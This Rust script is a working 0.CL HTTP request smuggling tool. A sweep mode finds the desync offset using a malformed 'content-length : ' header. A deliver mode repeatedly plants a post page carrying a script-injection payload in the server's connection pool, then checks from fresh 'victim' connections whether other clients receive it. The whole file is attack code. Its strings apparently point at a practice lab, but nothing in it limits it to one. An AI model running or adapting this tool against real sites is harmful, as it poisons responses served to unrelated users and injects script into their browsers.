#!/usr/bin/env rust-script
//! name: zc0cl3
//! description: 0.CL 偏移扫描与投递件 - sweep 模式:A(静态 gadget + `content-length : {C}`,无体)与 B(B=头块+revealed+截断 XSS)一次写(同连接相邻),逐 C 逐 rep 记账;当后端吃掉的 C 恰好等于 B 的前向头块长度时,残留 = revealed+smuggled,响应里出现 revealed 帖子页(判据 post_page),该 C 即当日偏移。deliver 模式:用命中偏移反复种植,关连接回池后以受害者连接 GET / 探测,看是否拿到载脚本的帖子页。
//! version: 1.0.0
//! args: <base-url> [--mode sweep|deliver] [--c N] [--cl-from N] [--cl-to N] [--cl-step N] [--reps N] [--post-id 1] [--seed-id 2] [--ua PAYLOAD] [--salt S] [--rounds N] [--victim-wait-ms N] [--victim-conns N] [--victim-read-ms N] [--dump] [--selftest]
//! keywords: smuggling, 0cl, desync, response-queue, poisoning, offset, sweep, xss, tls
//!
//! ```cargo
//! [dependencies]
//! rustls = "0.23"
//! webpki-roots = "0.26"
//! url = "2"
//! ```

use pi_rust_lib::serde_json::{json, Value};
use pi_rust_lib::timeout;
use std::io::{Read, Write};
use std::net::TcpStream;
use std::sync::Arc;
use std::time::{Duration, Instant};
use url::Url;

type Tls = rustls::StreamOwned<rustls::ClientConnection, TcpStream>;

fn connect(host: &str, port: u16) -> Result<Tls, String> {
    let mut roots = rustls::RootCertStore::empty();
    roots.extend(webpki_roots::TLS_SERVER_ROOTS.iter().cloned());
    let config = rustls::ClientConfig::builder().with_root_certificates(roots).with_no_client_auth();
    let name = rustls::pki_types::ServerName::try_from(host.to_string()).map_err(|e| format!("sni: {e}"))?;
    let tcp = TcpStream::connect((host, port)).map_err(|e| format!("connect: {e}"))?;
    let _ = tcp.set_nodelay(true);
    let conn = rustls::ClientConnection::new(Arc::new(config), name).map_err(|e| format!("tls: {e}"))?;
    let mut s = rustls::StreamOwned::new(conn, tcp);
    {
        let rustls::StreamOwned { conn, sock } = &mut s;
        conn.complete_io(sock).map_err(|e| format!("handshake: {e}"))?;
    }
    s.sock.set_read_timeout(Some(Duration::from_millis(120))).map_err(|e| format!("timeout: {e}"))?;
    Ok(s)
}

fn drain(s: &mut Tls, total_ms: u64, idle_ms: u64) -> Vec<u8> {
    let start = Instant::now();
    let mut buf: Vec<u8> = Vec::new();
    let mut last = Instant::now();
    let mut chunk = [0u8; 16384];
    loop {
        timeout::check();
        if start.elapsed() >= Duration::from_millis(total_ms) {
            break;
        }
        match s.read(&mut chunk) {
            Ok(0) => break,
            Ok(n) => {
                buf.extend_from_slice(&chunk[..n]);
                last = Instant::now();
            }
            Err(_) => {
                if !buf.is_empty() && last.elapsed() >= Duration::from_millis(idle_ms) {
                    break;
                }
                if buf.is_empty() && idle_ms == 0 {
                    break;
                }
            }
        }
    }
    buf
}

fn classify(buf: &[u8]) -> Value {
    let text = String::from_utf8_lossy(buf).to_string();
    let mut statuses: Vec<String> = Vec::new();
    for (off, _) in text.match_indices("HTTP/1.") {
        let rest = &text[off..];
        let end = rest.find("\r\n").unwrap_or(rest.len());
        let line = &rest[..end];
        let mut it = line.split(' ');
        let ver = it.next().unwrap_or("");
        let code = it.next().unwrap_or("");
        if ver.starts_with("HTTP/1.") && code.len() == 3 && code.chars().all(|c| c.is_ascii_digit()) {
            statuses.push(line.to_string());
        }
    }
    json!({
        "bytes": buf.len(),
        "statuses": statuses,
        "status_count": statuses.len(),
        "post_page": text.contains("Leave a comment") || text.contains("name=\"userAgent\"") || text.contains("name=userAgent"),
        "xss_hit": text.contains("<script>alert"),
        "head": text.chars().take(80).collect::<String>(),
    })
}

fn arg_val(argv: &[String], key: &str) -> Option<String> {
    let mut i = 0;
    while i < argv.len() {
        if argv[i] == key {
            return argv.get(i + 1).cloned();
        }
        i += 1;
    }
    None
}

struct Ctx {
    host: String,
    post_id: String,
    seed_id: String,
    ua: String,
    salt: String,
    filler_crlf: usize,
    a_prefix: String,
}

fn build(ctx: &Ctx, c: u64, tag: &str) -> (String, String, usize, usize) {
    let t = format!("GET /post?postId={} HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}", ctx.post_id, ctx.host, ctx.ua);
    let r = format!("GET /post?postId={} HTTP/1.1\r\nHost: {}\r\nConnection: keep-alive\r\n\r\n", ctx.seed_id, ctx.host);
    let filler = "\r\n".repeat(ctx.filler_crlf);
    let body = format!("{filler}{r}{t}");
    let m = body.len();
    let gurl_a = format!("{}{}{}", ctx.a_prefix, ctx.salt, tag);
    let gurl_b = format!("/resources/images/blog.svg?b={}{}", ctx.salt, tag);
    let hdr_b = format!("GET {gurl_b} HTTP/1.1\r\nHost: {}\r\nContent-Length: {m}\r\nConnection: keep-alive\r\n\r\n", ctx.host);
    let a = format!("GET {gurl_a} HTTP/1.1\r\nHost: {}\r\ncontent-length : {c}\r\nConnection: keep-alive\r\n\r\n", ctx.host);
    let b = format!("{hdr_b}{body}");
    (a, b, hdr_b.len(), m)
}

fn main() {
    let argv: Vec<String> = std::env::args().skip(1).collect();
    if argv.iter().any(|a| a == "--selftest") {
        let v = classify(b"HTTP/1.1 200 OK\r\n\r\nname=\"userAgent\"");
        let ok = v["status_count"] == 1 && v["post_page"] == true;
        pi_rust_lib::report::success("zc0cl3", json!({"selftest": if ok {"ok"} else {"fail"}, "v": v}), "classifier is the pure root").unwrap_or(());
        return;
    }
    let mut base = String::new();
    for a in &argv {
        if !a.starts_with("--") {
            base = a.clone();
            break;
        }
    }
    if base.is_empty() {
        pi_rust_lib::report::failure("zc0cl3", "usage", "call as: zc0cl3 <base-url> --mode sweep --cl-from 120 --cl-to 200");
        std::process::exit(2);
    }
    let parsed = Url::parse(&base).unwrap_or_else(|_| Url::parse("https://invalid/").unwrap());
    let host = arg_val(&argv, "--host").unwrap_or_else(|| parsed.host_str().unwrap_or("").to_string());
    let port = parsed.port().unwrap_or(443);
    let mode = arg_val(&argv, "--mode").unwrap_or_else(|| "sweep".to_string());
    let reps: u64 = arg_val(&argv, "--reps").and_then(|v| v.parse().ok()).unwrap_or(2);
    let seed_id = arg_val(&argv, "--seed-id").unwrap_or_else(|| "2".to_string());
    let post_id = arg_val(&argv, "--post-id").unwrap_or_else(|| "1".to_string());
    let ua = arg_val(&argv, "--ua").unwrap_or_else(|| "POC\"><script>alert(1)</script>".to_string());
    let salt = arg_val(&argv, "--salt").unwrap_or_else(|| "k".to_string());
    let dump = argv.iter().any(|a| a == "--dump");
    let read_ms: u64 = arg_val(&argv, "--read-ms").and_then(|v| v.parse().ok()).unwrap_or(2500);
    let victim_wait_ms: u64 = arg_val(&argv, "--victim-wait-ms").and_then(|v| v.parse().ok()).unwrap_or(250);
    let victim_conns: u64 = arg_val(&argv, "--victim-conns").and_then(|v| v.parse().ok()).unwrap_or(3);
    let victim_read_ms: u64 = arg_val(&argv, "--victim-read-ms").and_then(|v| v.parse().ok()).unwrap_or(4000);
    let rounds: u64 = arg_val(&argv, "--rounds").and_then(|v| v.parse().ok()).unwrap_or(20);
    let filler_crlf: usize = arg_val(&argv, "--filler-crlf").and_then(|v| v.parse().ok()).unwrap_or(0);
    let a_prefix = arg_val(&argv, "--a-prefix").unwrap_or_else(|| "/resources/images/blog.svg?a=".to_string());
    let ctx = Ctx { host: host.clone(), post_id, seed_id, ua, salt, filler_crlf, a_prefix };
    let _ = port;

    // sample B header length for the sweep default range
    let (_, _, hlen, mlen) = build(&ctx, 0, "sample");

    let mut out = json!({"url": base, "host": host, "mode": mode, "b_header_len": hlen, "b_body_len": mlen});

    if mode == "sweep" {
        let c_single: Option<u64> = arg_val(&argv, "--c").and_then(|v| v.parse().ok());
        let lo: u64 = arg_val(&argv, "--cl-from").and_then(|v| v.parse().ok()).unwrap_or(hlen.saturating_sub(6) as u64);
        let hi: u64 = arg_val(&argv, "--cl-to").and_then(|v| v.parse().ok()).unwrap_or((hlen + 40) as u64);
        let step: u64 = arg_val(&argv, "--cl-step").and_then(|v| v.parse().ok()).unwrap_or(1);
        let cs: Vec<u64> = match c_single {
            Some(c) => vec![c],
            None => {
                let mut v = Vec::new();
                let mut c = lo;
                while c <= hi {
                    v.push(c);
                    c += step;
                }
                v
            }
        };
        let mut rows: Vec<Value> = Vec::new();
        let mut boundaries: Vec<u64> = Vec::new();
        let mut last_err = String::new();
        for c in cs {
            for rep in 0..reps {
                timeout::check();
                let tag = format!("{c}_{rep}");
                let (a, b, hlen2, _) = build(&ctx, c, &tag);
                match connect(&host, port) {
                    Ok(mut s) => {
                        let both = format!("{a}{b}");
                        if s.write_all(both.as_bytes()).is_err() {
                            last_err = "write".to_string();
                            continue;
                        }
                        let _ = s.flush();
                        let resp = drain(&mut s, read_ms, 300);
                        let cc = classify(&resp);
                        let mut row = json!({"c": c, "rep": rep, "hdr_b_len": hlen2, "statuses": cc["statuses"], "status_count": cc["status_count"], "post_page": cc["post_page"], "xss_hit": cc["xss_hit"]});
                        if dump {
                            row["raw"] = json!(String::from_utf8_lossy(&resp).chars().take(1200).collect::<String>());
                        }
                        if cc["post_page"].as_bool().unwrap_or(false) {
                            boundaries.push(c);
                        }
                        rows.push(row);
                    }
                    Err(e) => last_err = e,
                }
            }
        }
        out["rows"] = json!(rows);
        out["boundaries"] = json!(boundaries);
        out["last_error"] = json!(last_err);
        pi_rust_lib::report::success("zc0cl3", out, "boundaries lists the C values where the leftover parsed as the revealed post page - the exact eaten offset").unwrap_or(());
        return;
    }

    // deliver mode: plant, close, then probe like a victim
    let c: u64 = arg_val(&argv, "--c").and_then(|v| v.parse().ok()).unwrap_or(hlen as u64);
    let mut rows: Vec<Value> = Vec::new();
    let mut victim_posts: u64 = 0;
    let mut victim_xss: u64 = 0;
    let mut last_err = String::new();
    'outer: for round in 0..rounds {
        timeout::check();
        let tag = format!("d{round}");
        let (a, b, _, _) = build(&ctx, c, &tag);
        match connect(&host, port) {
            Ok(mut s) => {
                let both = format!("{a}{b}");
                let _ = s.write_all(both.as_bytes());
                let _ = s.flush();
                let resp = drain(&mut s, 700, 200);
                let cc = classify(&resp);
                drop(s); // close attacker connection so the upstream returns to the pool
                let mut row = json!({"round": round, "plant": cc});
                if victim_wait_ms > 0 {
                    std::thread::sleep(Duration::from_millis(victim_wait_ms));
                }
                let mut vs: Vec<Value> = Vec::new();
                for _ in 0..victim_conns {
                    timeout::check();
                    let victim = format!("GET / HTTP/1.1\r\nHost: {host}\r\nAccept: text/html\r\nConnection: keep-alive\r\n\r\n");
                    let vr = (|| -> Result<Value, String> {
                        let mut s2 = connect(&host, port)?;
                        s2.write_all(victim.as_bytes()).map_err(|e| e.to_string())?;
                        let _ = s2.flush();
                        let bb = drain(&mut s2, victim_read_ms, 500);
                        Ok(classify(&bb))
                    })();
                    match vr {
                        Ok(v) => {
                            if v["post_page"].as_bool().unwrap_or(false) {
                                victim_posts += 1;
                            }
                            if v["xss_hit"].as_bool().unwrap_or(false) {
                                victim_xss += 1;
                            }
                            vs.push(v);
                        }
                        Err(e) => vs.push(json!({"error": e})),
                    }
                }
                row["victims"] = json!(vs);
                rows.push(row);
                if victim_xss > 0 {
                    break 'outer;
                }
            }
            Err(e) => last_err = e,
        }
    }
    out["rows"] = json!(rows);
    out["c"] = json!(c);
    out["victim_posts"] = json!(victim_posts);
    out["victim_xss"] = json!(victim_xss);
    out["last_error"] = json!(last_err);
    pi_rust_lib::report::success("zc0cl3", out, "victim_xss>0 means the queued XSS post page reached another client").unwrap_or(());
}
